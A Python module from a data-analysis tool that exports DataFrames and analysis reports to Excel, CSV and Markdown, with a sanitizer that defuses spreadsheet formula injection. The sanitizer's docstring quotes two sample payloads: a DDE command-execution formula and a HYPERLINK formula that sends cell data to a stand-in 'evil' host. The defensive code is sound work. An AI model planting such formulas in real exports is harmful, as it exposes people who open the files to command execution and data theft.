"""Export utilities for generating Excel workbooks and Markdown reports."""

import io
from typing import Any, Dict, Optional

import pandas as pd


def _fmt(value: Any, decimals: int = 4) -> str:
    """Format a numeric value safely — returns 'N/A' for None/NaN."""
    if value is None:
        return "N/A"
    try:
        f = float(value)
        if f != f:  # NaN check
            return "N/A"
        return f"{f:.{decimals}f}"
    except (TypeError, ValueError):
        return str(value)


_FORMULA_TRIGGER_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _escape_formula_value(v: Any) -> Any:
    return f"'{v}" if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_PREFIXES) else v


def _sanitize_for_spreadsheet(df: pd.DataFrame) -> pd.DataFrame:
    """Prefix formula-triggering string cells, column headers, and index
    labels with a single quote so Excel/Sheets treats them as literal text
    instead of a live formula.

    This writes back whatever data (and column names, and — for the
    correlation sheet — column names again as the index) was uploaded, so
    a malicious value like '=cmd|"/c calc"!A1' or
    '=HYPERLINK("http://evil/"&A1)' must not become an executable formula
    just because someone opens the export — confirmed live:
    pandas/openpyxl writes a leading '=' string as an actual <f> formula
    node, not literal text (CWE-1236, "CSV injection"). Only object/string
    columns are touched; real numeric/datetime/bool dtypes can't carry a
    formula-triggering string in the first place.
    """
    df = df.copy()
    for col in df.select_dtypes(include=["object"]).columns:
        df[col] = df[col].map(_escape_formula_value)
    df.columns = [_escape_formula_value(c) for c in df.columns]
    df.index = [_escape_formula_value(i) for i in df.index]
    return df


class DataExporter:
    """Handles data export to various formats."""

    def __init__(self, df: pd.DataFrame, report: Dict[str, Any]):
        self.df = df
        self.report = report

    def to_excel(self) -> bytes:
        """Export DataFrame and analysis to Excel with multiple sheets."""
        output = io.BytesIO()

        with pd.ExcelWriter(output, engine="openpyxl") as writer:
            # Write main data
            _sanitize_for_spreadsheet(self.df).to_excel(writer, sheet_name="Data", index=False)

            # Write summary statistics
            if "column_analysis" in self.report:
                summary_data = []
                for col in self.report["column_analysis"]:
                    row: Dict[str, Any] = {
                        "Column": col.get("name", ""),
                        "Type": col.get("dtype", ""),
                        "Missing": col.get("missing_count", 0),
                        "Missing %": col.get("missing_percent", 0),
                        "Unique": col.get("unique_count", 0),
                    }
                    stats = col.get("stats")
                    if stats:
                        row.update(
                            {
                                "Mean": stats.get("mean"),
                                "Median": stats.get("median"),
                                "Std": stats.get("std"),
                                "Min": stats.get("min"),
                                "Max": stats.get("max"),
                            }
                        )
                    summary_data.append(row)

                summary_df = _sanitize_for_spreadsheet(pd.DataFrame(summary_data))
                summary_df.to_excel(writer, sheet_name="Summary", index=False)

            # Write correlation matrix
            if "correlation_matrix" in self.report:
                corr = self.report["correlation_matrix"]
                if corr.get("columns"):
                    corr_df = _sanitize_for_spreadsheet(pd.DataFrame(
                        corr["matrix"],
                        columns=corr["columns"],
                        index=corr["columns"],
                    ))
                    corr_df.to_excel(writer, sheet_name="Correlations")

            # Write outliers
            if "outliers" in self.report:
                outliers_df = pd.DataFrame(self.report["outliers"])
                if not outliers_df.empty:
                    _sanitize_for_spreadsheet(outliers_df).to_excel(writer, sheet_name="Outliers", index=False)

            # Write quality score breakdown
            quality = self.report.get("quality_score")
            if quality:
                breakdown = quality.get("breakdown", {})
                if breakdown:
                    rows = []
                    for component, data in breakdown.items():
                        if isinstance(data, dict):
                            rows.append(
                                {
                                    "Component": component.replace("_", " ").title(),
                                    "Score": data.get("score"),
                                    "Weight": data.get("weight"),
                                    "Details": data.get("details", ""),
                                }
                            )
                        else:
                            # Fallback: data might be a bare score number
                            rows.append(
                                {
                                    "Component": component.replace("_", " ").title(),
                                    "Score": data,
                                    "Weight": None,
                                    "Details": "",
                                }
                            )
                    if rows:
                        quality_df = _sanitize_for_spreadsheet(pd.DataFrame(rows))
                        quality_df.to_excel(writer, sheet_name="Quality", index=False)

        output.seek(0)
        return output.getvalue()

    def to_csv(self) -> bytes:
        """Export DataFrame to CSV."""
        output = io.StringIO()
        _sanitize_for_spreadsheet(self.df).to_csv(output, index=False)
        return output.getvalue().encode("utf-8")

    def generate_markdown_report(self) -> str:
        """Generate a comprehensive markdown report of the analysis."""
        lines: list[str] = []
        lines.append("# Data Analysis Report\n")

        # ── Basic Info ─────────────────────────────────────────────────────
        info = self.report.get("basic_info")
        if info:
            rows = info.get("rows", 0)
            cols = info.get("columns", 0)
            mem = info.get("memory_usage_mb", 0)
            dups = info.get("duplicate_rows", 0)
            missing = info.get("total_missing", 0)

            lines.append("## Dataset Overview\n")
            lines.append(
                f"- **Rows**: {rows:,}"
                if isinstance(rows, (int, float))
                else f"- **Rows**: {rows}"
            )
            lines.append(f"- **Columns**: {cols}")
            lines.append(f"- **Memory Usage**: {mem} MB")
            lines.append(
                f"- **Duplicate Rows**: {dups:,}"
                if isinstance(dups, (int, float))
                else f"- **Duplicate Rows**: {dups}"
            )
            lines.append(
                f"- **Total Missing Values**: {missing:,}\n"
                if isinstance(missing, (int, float))
                else f"- **Total Missing Values**: {missing}\n"
            )

        # ── Quality Score ──────────────────────────────────────────────────
        quality = self.report.get("quality_score")
        if quality:
            overall = quality.get("overall_score", "?")
            grade = quality.get("grade", "")
            lines.append("## Data Quality\n")
            lines.append(f"**Overall Score**: {overall}/100")
            if grade:
                lines.append(f"**Grade**: {grade}\n")

            breakdown = quality.get("breakdown", {})
            if breakdown:
                lines.append("### Component Scores\n")
                for component, data in breakdown.items():
                    label = component.replace("_", " ").title()
                    if isinstance(data, dict):
                        score = data.get("score", "?")
                        details = data.get("details", "")
                        detail_str = f" — {details}" if details else ""
                        lines.append(f"- **{label}**: {score}/100{detail_str}")
                    else:
                        lines.append(f"- **{label}**: {data}/100")
                lines.append("")

            recommendations = quality.get("recommendations", [])
            if recommendations:
                lines.append("### Recommendations\n")
                for rec in recommendations:
                    lines.append(f"- {rec}")
                lines.append("")

        # ── Column Analysis ────────────────────────────────────────────────
        columns = self.report.get("column_analysis", [])
        if columns:
            lines.append("## Column Analysis\n")
            for col in columns[:20]:  # Cap at 20 to keep report manageable
                name = col.get("name", "?")
                dtype = col.get("dtype", "?")
                missing_count = col.get("missing_count", 0)
                missing_pct = col.get("missing_percent", 0)
                unique = col.get("unique_count", 0)

                lines.append(f"### {name}")
                lines.append(f"- Type: `{dtype}`")
                lines.append(f"- Missing: {missing_count} ({missing_pct}%)")
                lines.append(f"- Unique Values: {unique}")

                stats = col.get("stats")
                if stats:
                    lines.append(f"- Mean: {_fmt(stats.get('mean'))}")
                    lines.append(f"- Median: {_fmt(stats.get('median'))}")
                    lines.append(f"- Std Dev: {_fmt(stats.get('std'))}")
                    lines.append(
                        f"- Range: [{_fmt(stats.get('min'))}, {_fmt(stats.get('max'))}]"
                    )
                    skew = stats.get("skewness")
                    if skew is not None:
                        lines.append(f"- Skewness: {_fmt(skew)}")

                top_values = col.get("top_values")
                if top_values:
                    lines.append("- Top Values:")
                    for tv in top_values[:5]:
                        lines.append(
                            f"  - `{tv.get('value', '?')}`: {tv.get('count', 0)}"
                        )

                lines.append("")

        # ── Outliers ───────────────────────────────────────────────────────
        outliers = self.report.get("outliers", [])
        outliers_with_data = [o for o in outliers if o.get("outlier_count", 0) > 0]
        if outliers_with_data:
            lines.append("## Outlier Detection\n")
            for outlier in outliers_with_data[:10]:
                col_name = outlier.get("column", "?")
                count = outlier.get("outlier_count", 0)
                pct = outlier.get("outlier_percent", 0)
                iqr = outlier.get("iqr")
                lb = outlier.get("lower_bound")
                ub = outlier.get("upper_bound")

                lines.append(f"### {col_name}")
                lines.append(f"- Outliers: {count} ({pct}%)")
                lines.append(f"- IQR: {_fmt(iqr)}")
                lines.append(f"- Bounds: [{_fmt(lb)}, {_fmt(ub)}]")
                lines.append("")

        # ── Type Suggestions ───────────────────────────────────────────────
        suggestions = self.report.get("type_suggestions", {})
        has_suggestions = any(
            suggestions.get(key)
            for key in (
                "datetime_suggestions",
                "categorical_suggestions",
                "numeric_suggestions",
                "boolean_suggestions",
            )
        )
        if has_suggestions:
            lines.append("## Type Suggestions\n")
            for key, label in [
                ("datetime_suggestions", "Datetime"),
                ("categorical_suggestions", "Categorical"),
                ("numeric_suggestions", "Numeric"),
                ("boolean_suggestions", "Boolean"),
            ]:
                items = suggestions.get(key, [])
                if items:
                    lines.append(f"### {label}\n")
                    for s in items:
                        col_name = s.get("column", "?")
                        current = s.get("current_type", "?")
                        suggested = s.get("suggested_type", "?")
                        reason = s.get("reason", "")
                        lines.append(
                            f"- **{col_name}**: `{current}` → `{suggested}` — {reason}"
                        )
                    lines.append("")

        # ── Correlation Highlights ─────────────────────────────────────────
        corr = self.report.get("correlation_matrix", {})
        corr_cols = corr.get("columns", [])
        matrix = corr.get("matrix", [])
        if corr_cols and matrix:
            strong_pairs: list[tuple[str, str, float]] = []
            for i, c1 in enumerate(corr_cols):
                for j, c2 in enumerate(corr_cols):
                    if j <= i:
                        continue
                    try:
                        val = float(matrix[i][j])
                    except (TypeError, ValueError, IndexError):
                        continue
                    if abs(val) >= 0.7:
                        strong_pairs.append((c1, c2, val))

            if strong_pairs:
                strong_pairs.sort(key=lambda x: abs(x[2]), reverse=True)
                lines.append("## Strong Correlations (|r| ≥ 0.7)\n")
                for c1, c2, val in strong_pairs[:15]:
                    lines.append(f"- **{c1}** ↔ **{c2}**: {val:.3f}")
                lines.append("")

        lines.append("---\n")
        lines.append("*Report generated by Sushi EDA*")

        return "\n".join(lines)
